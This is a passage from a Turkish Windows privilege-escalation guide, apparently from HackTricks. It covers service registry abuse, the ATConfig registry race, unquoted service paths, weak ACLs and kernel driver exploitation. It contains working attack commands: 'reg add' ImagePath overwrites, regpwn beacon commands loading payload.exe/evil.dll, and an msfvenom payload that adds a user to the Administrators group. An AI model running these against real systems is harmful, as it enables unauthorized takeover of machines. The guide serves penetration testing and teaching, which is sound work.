. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Hizmet normal bir kullanıcının hizmeti yeniden başlatmasına izin vermiyorsa, açılışta otomatik olarak başlayıp başlamadığını, yeniden başlatan bir hata eylemi olup olmadığını veya onu kullanan uygulama tarafından dolaylı olarak tetiklenip tetiklenemeyeceğini kontrol edin.

### Hizmet kayıt defteri değiştirme izinleri

Herhangi bir hizmet kayıt defterini değiştirip değiştiremeyeceğinizi kontrol edin.\
Bir hizmet **kayıt defteri** üzerindeki **izinlerinizi** şu şekilde **kontrol edebilirsiniz**:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Belirli bir hizmet anahtarında **Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** grubunun yazma yetkisi veren kayıt defteri izinlerine sahip olup olmadığını inceleyin. Tek başına bir ACL girdisi etkin erişimi kanıtlamaz: reddetme girdileri, geçerli token ve devralınan izinler önemlidir. Kayıt defteri anahtarı hakları, hizmet nesnesinin `SERVICE_CHANGE_CONFIG` ve `SERVICE_START` haklarından ayrıdır. Yetki yükseltme için ayrıca kullanılabilir bir hizmet yapılandırma alanı, hizmeti tetikleme yolu ve daha ayrıcalıklı bir hizmet kimliği gerekir. Microsoft'un [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) ve [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) sayfalarına bakın.

Çalıştırılan ikilinin Path değerini değiştirmek için:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink yarışıyla rastgele HKLM değer yazma (ATConfig)

Bazı Windows Erişilebilirlik özellikleri, daha sonra bir **SYSTEM** işlemi tarafından HKLM oturum anahtarına kopyalanan kullanıcı başına **ATConfig** anahtarları oluşturur. Bir registry **symbolic link race**, bu ayrıcalıklı yazma işlemini **herhangi bir HKLM yoluna** yönlendirerek rastgele bir HKLM **değer yazma** primitive'i sağlar.<sup>[[18]](#references)</sup>

Anahtar konumları (örnek: Ekran Klavyesi `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs`, yüklü erişilebilirlik özelliklerini listeler.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>`, kullanıcı tarafından kontrol edilen yapılandırmayı depolar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>`, oturum açma/güvenli masaüstü geçişleri sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Kötüye kullanım akışı (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz değeri **HKCU ATConfig** içine yerleştirin.
2. Güvenli masaüstü kopyalama işlemini tetikleyin (ör. **LockWorkstation**); bu, AT broker akışını başlatır.
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` üzerine bir **oplock** koyarak **yarışı kazanın**; oplock tetiklendiğinde **HKLM Session ATConfig** anahtarını korumalı bir HKLM hedefini işaret eden bir **registry link** ile değiştirin.
4. SYSTEM, saldırganın seçtiği değeri yönlendirilmiş HKLM yoluna yazar.

Rastgele HKLM değer yazma elde ettikten sonra, hizmet yapılandırma değerlerinin üzerine yazarak LPE'ye geçin:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komut satırı)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Normal bir kullanıcının başlatabileceği bir hizmet seçin (ör. **`msiserver`**) ve yazma işleminden sonra bu hizmeti tetikleyin. **Not:** herkese açık exploit uygulaması, yarışın bir parçası olarak iş istasyonunu **kilitler**.

Örnek araçlar (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

Bir registry üzerinde bu izne sahipseniz, **bu registry altında alt registry'ler oluşturabilirsiniz**. Windows services söz konusu olduğunda bu, **rastgele kod yürütmek için yeterlidir:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Bir executable'ın yolu tırnak işaretleri içine alınmamışsa Windows, boşluklardan önceki her bitişi yürütmeyi dener.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows şunları yürütmeyi dener:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Yerleşik Windows hizmetlerine ait olanlar hariç, tırnak içine alınmamış tüm hizmet yollarını listeleyin:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Bu güvenlik açığını metasploit ile tespit edip exploit edebilirsiniz:** `exploit/windows/local/trusted\_service\_path` Metasploit ile manuel olarak bir servis binary'si oluşturabilirsiniz:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Kurtarma Eylemleri

Windows, kullanıcıların bir hizmet başarısız olduğunda gerçekleştirilecek eylemleri belirtmesine izin verir. Bu özellik bir binary'yi gösterecek şekilde yapılandırılabilir. Bu binary değiştirilebiliyorsa privilege escalation mümkün olabilir. Daha fazla bilgi [resmî belgelerde](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) bulunabilir.

## Zamanlanmış görev betiği hedefleri

`.bat` veya `.cmd` dosyasıyla `cmd.exe /c` çalıştıran etkin bir görev için, `cmd.exe`'nin yanı sıra **eylem bağımsız değişkenlerinde** adı geçen betiği de kontrol edin. Aynı durum, PowerShell `-File` gibi bir yorumlayıcının açık dosya bağımsız değişkeni için de geçerlidir. Zamanlanmış bir batch dosyası doğrudan bir PowerShell `-File` çağrısı içeriyorsa, başvurulan betiğin ACL'sini de inceleyin; değişkenler, koşullar ve kabuk zincirlemeleri manuel olarak izlenmelidir. Çağıranın yazabildiği bir betik veya üst dizin, yalnızca yapılandırılmış görev sorumlusu çağırandan farklıysa ve görev gerçekten ilgili eyleme ulaşıyorsa hesaplar arası yürütme için bir ipucudur. Betiklerde yalnızca sona eklemeye izin veren bir ACL önemli olabilir; ancak daha önceki bir `exit` veya başka bir kontrol akışı, eklenen satırların erişilemez olmasına neden olabilir. Privilege escalation olduğunu öne sürmeden önce etkin ACL'leri, [görev yürütme bağlamını](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), çalışma dizinini, tetikleyiciyi ve uygulama denetimi ilkesini doğrulayın. Envanter çıkarma sırasında betiği değiştirmeyin veya görevi başlatmayın.

## Erişilebilen dosyalardaki adlandırılmış akışlar

NTFS'de okunabilir bir dosyanın, sıradan bir dizin listelemesinde gösterilmeyen adlandırılmış bir `:$DATA` akışı olabilir. Erişilebilen yedekleme veya yapılandırma dosyalarından küçük ve ilgili bir küme için, içeriği açmadan önce akış **adlarını ve boyutlarını** inceleyin; Windows bunları [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) ve PowerShell'in [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) komutlarıyla gösterir. Bir sırrı düşündüren akış adı yalnızca bir ipucudur. Dosyanın etkin okuma erişimini, dosya sisteminin akış desteğini, akışın kullanılabilir kimlik bilgileri içerip içermediğini ve bu kimlik bilgilerinin hangi hesapla kimlik doğruladığını kontrol edin. Rutin envanter çıkarma sırasında özyinelemeli akış taramalarından ve akış içeriklerini yazdırmaktan kaçının.

## Zamanlanmış Windows Driver Kit yardımcı programı girdileri

İsteğe bağlı Windows Driver Kit, çalıştırıldığı dizindeki `command.txt`, `reboot.rsf` ve proje `working\rsf.rsf` dosyasını kullanabilen `StandaloneRunner.exe` içerir. Bu yardımcı programı ayrıcalıklı bir hesapla başlatan zamanlanmış görev veya hizmet, yardımcı programın çalıştırılabilir dosyası korumalı olsa bile bu girdilere düşük ayrıcalıklı yazma erişimini o hesabın bağlamında komut yürütmeye dönüştürebilir. Ayrıcalıklı tüketiciyi ve **her iki** ek dosyanın oluşturulabildiğini veya değiştirilebildiğini doğrulayın; yalnızca yardımcı programı bulmak yeterli değildir.

Zamanlanmış bir görev için, eylemin [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) değerini ve iki ek dosya yolunun ACL'lerini inceleyin. Görev bir çalışma dizini belirtmiyorsa, yürütülebilir dosyanın dizini, görevin girdilerini nereden okuduğunu doğrulamak için yalnızca bir ipucudur; kanıt değildir. Proje çalışma dosyası önkoşulu da karşılanmalıdır. Görevin SYSTEM olarak çalıştığını varsaymak yerine, gerçek görev sorumlusunu kontrol edin.

## Uygulamalar

### Yüklü Uygulamalar

**Binary'lerin izinlerini** (belki birini üzerine yazıp privilege escalation sağlayabilirsiniz) ve **klasörlerin** izinlerini ([DLL Hijacking](dll-hijacking/index.html)) kontrol edin.

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent onarım yolu

[CVE-2024-0670](https://checkmk.com/werk/16361), `C:\Windows\Temp` konumunda komut dosyaları oluşturan ve değiştirme başarısız olduğunda önceden var olan, yazmaya karşı korumalı bir dosyayı çalıştıran eski Checkmk Windows agent sürümlerini etkiler. Üretici sorunu 2.1.0p40, 2.2.0p23, 2.3.0b1 ve 2.4.0b1 sürümlerinde düzeltti. Yüklü tam yama düzeyini ve etkilenen agent işleminin çalıştırılıp çalıştırılamadığını kontrol edin; `2.1` gibi yalnızca dalı belirten bir etiket, sistemin etkilenip etkilenmediğini göstermez. Numaralandırma; dosya oluşturmadan veya agent komutlarını tetiklemeden sürümü, hizmet durumunu ve Temp izinlerini inceleyebilir.

#### ADSelfService Plus SAML hizmeti incelemesi

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html), ADSelfService Plus build 6210 ve önceki sürümleri etkiledi; üretici sorunu build 6211'de düzeltti. Yalnızca SAML SSO **etkinse veya geçmişte etkin olmuşsa** önem taşır. Bu nedenle yüklü ürün girdisi veya hizmet yolu bir ipucudur, güvenlik açığı kanıtı değildir: tam build sürümünü, SAML yapılandırma geçmişini, hizmetin ağdan erişilebilirliğini ve hangi hesapla çalıştığını doğrulayın. Hizmet üzerinden kod çalıştırılması, o hesabın yetkilerini devralır; SYSTEM olarak çalıştırılması için örneğin SYSTEM hesabıyla çalışıyor olması gerekir. Ürünün Backup dizininde okunabilen bir `OfflineBackup_*.ezip`, ayrı ve şifrelenmiş bir yedekleme ipucudur; kullanılabilir bir kimlik bilgisinin veya bu SAML açığının kanıtı değildir. Rutin numaralandırma sırasında dosyayı açmadan yolunu ve erişim haklarını kaydedin.

#### Jenkins controller ve domain hesabı sınırları

Windows Jenkins controller'ında iş oluşturma veya yapılandırma iznini işi başlatma izninden ayırın: [Jenkins bunları ayrı `Job/Create`, `Job/Configure` ve `Job/Build` hakları olarak belgeliyor](https://www.jenkins.io/doc/book/security/access-control/permissions/). Yapılandırılmış bir zamanlama veya uzak tetikleyici başka bir build yolu sağlayabilir; ancak etkin olduğunu ve build'in gerçekten çalıştığını doğrulayın. Çalıştırma, controller'ın veya seçilen agent'ın kimliğiyle yapılır; kayıtlı bir kimlik bilgisi yalnızca işin kapsamına erişebiliyorsa kullanılabilir. Ayrıca `JENKINS_HOME` meta verilerine erişimi inceleyin: Jenkins, kimlik bilgisi malzemelerini ve şifreleme anahtarlarını `credentials.xml`, `secrets/hudson.util.Secret` ve `secrets/master.key` dosyalarında tutar ([Jenkins gizli bilgi depolama](https://www.jenkins.io/doc/developer/security/secrets/)). Bu dosyaların varlığı tek başına bir parolayı açığa çıkarmaz; paylaşılan çıktılara gizli bilgileri yazdırmadan **gerekli dosyalara okuma erişimini** ve hesaptan yeniden yararlanmaya yönelik ayrı bir yolu doğrulayın. Hesabın AD kullanıcı nesnesinde `scriptPath` yazma hakkı varsa, bunu kullanıcılar arası çalıştırma olarak değerlendirmeden önce yazılabilir bir betik yolu ve hedef kullanıcı olarak çalışan gerçek bir oturum açma işlemi veya zamanlanmış tüketici bulunduğunu doğrulayın. Ek grup denetimi için etkin AD hakları ayrıca doğrulanmalıdır.

#### Azure Pipelines self-hosted agent kimliği

Azure DevOps Server veya Azure Pipelines projesinde, pipeline **oluşturma veya düzenleme** iznini pipeline'ı kuyruğa alma ve seçilen agent pool'u kullanma izninden ayırın; [Microsoft pipeline izinlerini](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) ve [pool yetkilendirmesini](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) ayrı ayrı belgeliyor. Düşük yetkili bir hesap bir betik adımı gönderebiliyor ve bu pipeline'ı self-hosted Windows agent üzerinde çalıştırabiliyorsa, adım [agent'ın yapılandırılmış işletim sistemi hesabıyla](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) yürütülür. Kullanıcılar arası veya SYSTEM geçişi olduğu iddiasında bulunmadan önce tam pipeline'ı, branch/resource kısıtlamalarını, yetkilendirilmiş pool'u, çalıştırılabilir işi ve agent hizmet kimliğini doğrulayın. Yüklü bir agent, proje rolü veya depoya yazma izni tek başına yalnızca bir ipucudur; pasif numaralandırma sırasında build başlatmadan izinleri ve yerel hizmet meta verilerini inceleyin.

#### Microsoft Entra Connect Sync kimlik bilgileri

[Microsoft,](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) senkronizasyon hizmetini çalıştıran ve SQL veritabanına erişen **ADSync hizmet hesabı** ile dizin izinleri yapılandırılmış senkronizasyon özelliklerine bağlı olan **AD DS connector hesabı** arasında ayrım yapar. Connector kimlik bilgileri bu veritabanında şifrelenmiş olarak saklanır; anahtar malzemesi [ADSync hizmet hesabı altında DPAPI ile korunur](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Yüklü bir sync hizmeti, yerel yönetici izlenimi veren bir grup veya yalnızca veritabanının görünür olması, çözülebilir bir kimlik bilgisinin ya da domain yükseltmesinin varlığını kanıtlamaz. Gerçek veritabanı okuma haklarını, hizmet hesabı/anahtar erişimini, kurulum ve SQL düzenini, yapılandırılmış connector kimliğini ve bu kimliğin etkin AD ayrıcalıklarını ayrı ayrı inceleyin. Rutin numaralandırmada yalnızca hizmet ve erişim meta verilerini gösterin; saklanan gizli bilgileri sorgulamayın veya yazdırmayın.

#### Printer driver destek DLL izinleri

Yüklü bir printer driver, destek DLL'lerini `C:\ProgramData` altında tutabilir ve bunları daha ayrıcalıklı bir print işleminde yükleyebilir. Printer WMI numaralandırması reddedilse bile, üst dizinleri ve reparse point'leri de kapsayacak şekilde ilgili driver dizinini ve DLL ACL'lerini inceleyin. [Ricoh printer-driver sorunu CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) için bildirilen yol `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` idi; [ilk açıklama](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) DLL'lerin `PrintIsolationHost.exe` tarafından yüklendiğini belirtiyor. Yazılabilir bir ACL yalnızca bir ipucudur: deny girdileri sonrasında etkin yazma erişimini, ilgili driver'ın kurulu olduğunu ve dosyayı ayrıcalıklı bir kimlikle yüklediğini, ayrıca üreticinin güncellenmiş driver'ının veya güvenlik programının kurulumu düzeltip düzeltmediğini doğrulayın. Yalnızca dizin adına veya driver sürümüne bakarak güvenlik açığı olduğu sonucuna varmayın.

### Yazma İzinleri

Bazı özel dosyaları okuyabilmek için bir yapılandırma dosyasını değiştirebiliyor musunuz veya bir Yönetici hesabı tarafından çalıştırılacak bir binary'yi (zamanlanmış görevlerde) değiştirebiliyor musunuz kontrol edin.

Sistemdeki zayıf klasör/dosya izinlerini bulmanın bir yolu şunu yapmaktır:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ eklentisinin otomatik yüklenerek kalıcılık/çalıştırma sağlaması

Notepad++, `plugins` alt klasörlerindeki tüm eklenti DLL'lerini otomatik yükler. Yazılabilir bir taşınabilir/kopya kurulum varsa kötü amaçlı bir eklenti bırakmak, her başlatmada `notepad++.exe` içinde otomatik kod çalıştırılmasını sağlar (`DllMain` ve eklenti geri çağrıları dahil).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Başlangıçta çalıştırma

**Başka bir kullanıcı tarafından çalıştırılacak bir kayıt defteri girdisinin veya ikili dosyanın üzerine yazıp yazamayacağınızı kontrol edin.**\
**Yetkileri yükseltmek için ilgi çekici otomatik çalıştırma konumları** hakkında daha fazla bilgi edinmek için **aşağıdaki sayfayı okuyun**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sürücüler

Olası **üçüncü taraf, tuhaf/güvenlik açığı bulunan** sürücüleri arayın.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Bir driver keyfi kernel read/write primitive sunuyorsa (kötü tasarlanmış IOCTL handler'larında sık görülür), doğrudan kernel memory'den bir SYSTEM token'ı çalarak yetki yükseltebilirsiniz.<sup>[[13]](#references)</sup> Adım adım tekniği burada görebilirsiniz:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

İlgili Windows kernel exploitation içerikleri:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Savunmasız çağrının saldırganın kontrolündeki bir Object Manager yolunu açtığı race-condition hatalarında, aramayı kasıtlı olarak yavaşlatmak (maksimum uzunlukta bileşenler veya derin directory zincirleri kullanarak) zaman aralığını mikrosaniyelerden onlarca mikrosaniyeye çıkarabilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### Cancel-safe queue UAF'leri, paged-pool disclosure'ları ve I/O ring pivot'ları

Bazı Windows kernel LPE zincirleri, tek başlarına zayıf olan iki bug'dan oluşturulabilir: queue lock hâlâ tutulurken bir request/CBD'yi serbest bırakan **cancel-safe queue lifetime race** ve `RtlCopyToUser` sırasında serbest bırakılmış bir paged-pool allocation'dan leak yapan **copy öncesi lock bırakma** disclosure'ı.<sup>[[29]](#references)</sup>

Denetim ve exploitation notları:

- **Lock altında serbest bırakma + ardından cancel**: success path'in **Acquire -> CompleteRequest/free -> Release**, cancel path'in ise **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** yaptığı bir duruma bakın. Success path, CBDQ/CSQ lock'unu bırakmadan önce `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` çağrısına ulaşırsa, `NtCancelIoFileEx -> IopCsqCancelRoutine` içinde bekleyen bir thread daha sonra devam edip serbest bırakılmış bir `PFLT_CALLBACK_DATA`'yı driver's remove callback'ine geçirebilir.
- Serbest bırakılan queue object'i aynı boyutta, saldırganın kontrolündeki bir paged-pool allocation ile **yeniden kullanın**. `NPFS` Data Queue Entries kullanışlıdır; çünkü payload ve boyut kontrol edilebilir, ayrıca bunları daha sonra pipe read/peek işlemleriyle yoklayabilirsiniz. Serbest bırakılan object list link'leri içeriyorsa, driver'ın özgün list head'inde durmak yerine saldırgan tanımlı request structure'larını tekrar tekrar işlemesi için bunları **user memory'deki sahte request node'larından oluşan döngüsel bir listeyle** üzerine yazın.
- **Tahmin edilebilir bir write'ı yükseltin**: sahte request, bookkeeping write'larında kullanılan iç içe bir context pointer'ını (timestamps / QPC / refcount bitişiğindeki alanlar) başka yere yönlendiriyorsa, **adresi kontrol edilebilir ama değeri kontrol edilemeyen** bir kernel write elde edebilirsiniz. Bu durumda son bir code/data pointer yerine, spray edilmiş bir pool object'in **length/size** alanını hedefleyin; ardından bozulmuş object'in out-of-bounds paged-pool read sağlamasını bulana kadar spray'i tarayın.
- **Raceable disclosure örüntüsü**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` yapan her syscall güçlü bir adaydır. Saldırgan kopyalanan buffer'ı büyütebiliyorsa (örneğin serializer'ın nihai allocation boyutunu artıran çok sayıda list/resource entry ekleyerek) güvenilirlik artar; çünkü daha uzun kopyalama, makinenin çökmesine yol açmadan replacement window'ı genişletir.
- **Pointer bakımından zengin refill hedefleri**: Windows **I/O ring** registered-buffer array'leri, paged-pool boyutları saldırgan tarafından kontrol edilebildiği (`8 * regBufferCnt`) ve her öğe bir `_IOP_MC_BUFFER_ENTRY` için kernel pointer'ı olduğu için mükemmel disclosure hedefleridir. Bu array'lerden birini leak edin, çevresindeki `IORING_OBJECT`'i bulun, ardından sonraki I/O ring işlemlerinin saldırganın oluşturduğu entry'leri kullanıp keyfi kernel read/write sağlaması için **`RegBuffers`** ve **`RegBuffersCount`** alanlarını bozun. Kullanılabilen tek write size sabit bir byte veriyorsa (örneğin `KUSER_SHARED_DATA+0x14` üzerinden), `0x0101010101010101` gibi tekrarlanan byte'lardan oluşan bir user pointer oluşturmak için **hizalanmamış, örtüşen write'lar** kullanın; bu adresi `VirtualAlloc` ile map edip sahte registered-buffer array'ini oraya yerleştirin.<sup>[[30]](#references)</sup>

Faydalı debugging göstergeleri:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Corrupted I/O ring üzerinden arbitrary kernel read/write elde ettikten sonra, standart post-primitive workflow’u kullanarak bir SYSTEM token çalın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive bellek bozulması primitive'leri

Modern hive güvenlik açıkları deterministik bellek düzenleri oluşturmanıza, yazılabilir HKLM/HKU alt anahtarlarını kötüye kullanmanıza ve metadata bozulmasını özel bir driver olmadan kernel paged-pool taşmalarına dönüştürmenize olanak tanır. Zincirin tamamını burada öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Saldırgan denetimindeki yollardan kaynaklanan `RtlQueryRegistryValues` direct-mode type confusion

Bazı driver'lar userland'den bir registry yolu kabul eder, yalnızca bunun geçerli bir UTF-16 string olduğunu doğrular ve ardından `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` çağrısını `int readValue` gibi bir stack scalar'a `RTL_QUERY_REGISTRY_DIRECT` ile yapar. `RTL_QUERY_REGISTRY_TYPECHECK` yoksa `EntryContext`, geliştiricinin beklediği türe göre değil, registry'deki **gerçek** türe göre yorumlanır.

Bu durum iki faydalı primitive oluşturur:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: Kullanıcı denetimindeki mutlak bir `\Registry\...` yolu, driver'ın saldırganın seçtiği anahtarları sorgulamasına, dönüş kodları/loglar aracılığıyla anahtarların varlığını sızdırmasına ve bazen çağıranın doğrudan erişemeyeceği değerleri okumasına olanak tanır.
- **Kernel bellek bozulması**: `&readValue` gibi bir scalar hedef, registry değerinin türüne bağlı olarak `REG_QWORD`, `UNICODE_STRING` veya boyutlu bir binary buffer olarak type confusion'a uğrar.

Pratik exploit notları:

- **Windows 8+ azaltımı**: Sorgu, `RTL_QUERY_REGISTRY_TYPECHECK` olmadan `RTL_QUERY_REGISTRY_DIRECT` kullanarak **güvenilmeyen bir hive**'a erişirse kernel çağıranları `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ile çöker. Exploit edilebilirliği korumak için değerleri `HKCU` altında oluşturmak yerine **güvenilir sistem hive'ları içindeki saldırgan tarafından yazılabilir anahtarları** arayın.
- **Güvenilir hive'da değer oluşturma**: Yazılabilir `\Registry\Machine` alt anahtarlarını listelemek için NtObjectManager kullanın ve sandbox'lı bağlamlardan erişilebilen anahtarları bulmak için taramayı kopyalanmış bir **düşük bütünlük düzeyli** token ile yeniden çalıştırın:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4 baytlık bir `int` içine yapılan 8 baytlık doğrudan yazma, bitişik stack verilerini bozar ve yakındaki bir callback/function pointer'ı kısmen üzerine yazabilir.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode, `EntryContext`'in bir `UNICODE_STRING`'i göstermesini bekler. Kod önce saldırganın kontrolündeki bir `REG_DWORD` değerini stack scalar'ına yükleyip ardından aynı buffer'ı string okuması için yeniden kullanırsa saldırgan `Length`/`MaximumLength` değerlerini kontrol eder ve `Buffer` pointer'ını kısmen etkileyerek kısmen kontrol edilen bir kernel write elde eder.
- **`REG_BINARY`**: büyük binary verilerde direct mode, `EntryContext`'teki ilk `LONG` değerini işaretli bir buffer boyutu olarak kabul eder. Önceki bir `REG_DWORD` okuması, yeniden kullanılan scalar'da saldırganın kontrol ettiği **negatif** bir değer bırakırsa sonraki `REG_BINARY` sorgusu saldırganın baytlarını doğrudan bitişik stack slot'larının üzerine kopyalar. Bu, callback-pointer'ı tamamen üzerine yazmak için genellikle en temiz yoldur.

Güçlü bir hunting pattern: **aynı stack variable içine, yeniden başlatmadan, farklı türlerde registry okumaları yapmak**. `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, yeniden kullanılan `EntryContext` pointer'ları ve ilk registry okumasının ikinci okumanın yapılıp yapılmayacağını belirlediği code path'ler için grep yapın.

#### Device object'lerde FILE_DEVICE_SECURE_OPEN eksikliğini kötüye kullanma (LPE + EDR kill)

Bazı imzalı üçüncü taraf driver'lar, IoCreateDeviceSecure ile güçlü bir SDDL kullanarak device object oluşturur ancak DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN ayarlamayı unutur. Bu flag olmadan device, fazladan bir bileşen içeren bir path üzerinden açıldığında secure DACL uygulanmaz. Böylece ayrıcalıksız herhangi bir kullanıcı şu tür bir namespace path kullanarak handle alabilir:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek dünyadan bir örnek)

Kullanıcı device'ı açabildiğinde, driver'ın sunduğu ayrıcalıklı IOCTL'ler LPE ve tampering için kötüye kullanılabilir. Gerçek dünyada gözlemlenen örnek yetenekler:
- İstenilen process'lere tam erişimli handle'lar döndürmek (token theft / DuplicateTokenEx/CreateProcessAsUser üzerinden SYSTEM shell).
- Kısıtlamasız raw disk okuma/yazma (offline tampering, boot-time persistence hileleri).
- Protected Process/Light (PP/PPL) dahil istenilen process'leri sonlandırmak; böylece kernel üzerinden user land'den AV/EDR kill gerçekleştirmek.

Minimal PoC pattern (user mode):
```c
